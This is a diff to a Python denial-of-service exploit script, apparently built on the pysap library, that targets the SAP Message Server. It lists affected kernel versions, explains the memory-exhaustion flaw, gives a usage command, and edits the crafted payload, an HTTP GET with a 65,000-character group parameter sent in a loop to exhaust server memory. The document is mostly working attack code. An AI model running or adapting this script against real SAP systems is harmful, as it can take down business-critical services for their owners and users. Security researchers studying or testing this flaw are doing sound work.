@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# coding=utf-8
 # ===========
 # pysap - Python library for crafting SAP's network protocols packets
 #
@@ -21,8 +20,6 @@
 # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 # GNU General Public License for more details.
 # ==============
-
-
 
 """
 Vulnerable SAP Kernel versions
@@ -46,7 +43,7 @@ SAP KERNEL 7.45 64-BIT UNICODE
 SAP KERNEL 7.49 64-BIT UNICODE
 
 TECHNICAL DESCRIPTION
-The message server doesn’t free properly the resources allocation for handling the clients
+The message server doesn't free properly the resources allocation for handling the clients
 request in the case where the requests size is between 4k and 65k. In this special case,
 the server answers with an empty reply as opposed to the case where the request is greater
 than 65k, then the server will reset the connection. The following shows log of the msgserver
@@ -54,6 +51,9 @@ process being killed because of too much memory allocated:
 
 [4721576.189056] Out of memory: Kill process 14223 (ms.sapJ45_SCS01) score 243 or sacrifice child
 [4721576.189058] Killed process 14223 (ms.sapJ45_SCS01) total-vm:3321508kB, anon-rss:2468184kB, file-rss:0kB
+
+example 
+python ms_server_denial_of_service.py -d SAP_SERVER -p 8101 --route-string ROUTE_STRING -v
 """
 
 # Standard imports
@@ -62,10 +62,13 @@ from time import sleep
 from socket import error as SocketError
 from optparse import OptionParser, OptionGroup
 # External imports
+from pysap.SAPRouter import SAPRoutedStreamSocket, SAPRouterRouteHop
+from scapy.layers.inet import TCP
+from scapy.packet import Raw
 from scapy.config import conf
+import requests
 # Custom imports
 import pysap
-from pysap.SAPRouter import SAPRoutedStreamSocket
 
 
 # Set the verbosity to 0
@@ -101,7 +104,7 @@ def parse_options():
                     help="Loop until the user cancel (Ctrl+C) [%default]")
     misc.add_option("-n", "--number", dest="number", type="int", default=10,
                     help="Number of packets to send [%default]")
-    misc.add_option("-t", "--time", dest="delay", type="int", default=5,
+    misc.add_option("-t", "--time", dest="delay", type="float", default=5,
                     help="Time to wait between each round [%default]")
     misc.add_option("-v", "--verbose", dest="verbose", action="store_true", default=False,
                     help="Verbose output [%default]")
@@ -121,8 +124,9 @@ def send_crash(host, port, item, verbose, route=None):
     if verbose:
         print("[*] Sending crash")
     # Initiate the connection
-    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route)
+    conn = SAPRoutedStreamSocket.get_nisocket(host, port, route, talk_mode=1)
     conn.send(item)
+    conn.close()
 
 # Main function
 def main():
@@ -136,8 +140,8 @@ def main():
 
     # Crafting the item
 
-    item = "\x47\x45\x54\x20\x2f\x6d\x73\x67\x73\x65\x72\x76\x65\x72\x2f\x68\x74\x6d\x6c\x2f\x67\x72\x6f\x75\x70\x3f\x67\x72\x6f\x75\x70\x3d" + "\x41" * 65000 + "\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0a\x0a"
-    options.route_ni_version=0
+    item = "GET /msgserver/html/group?group=" + "A" * 65000 + " HTTP/1.0\r\n"
+
     try:
         if options.loop:
             try:
@@ -152,7 +156,7 @@ def main():
                 sleep(options.delay)
 
     except SocketError:
-        print("[*] Connection error, take a look at the enqueue server process !")
+        print("[*] Connection error, take a look at the message server process !")
 
 
 if __name__ == "__main__":
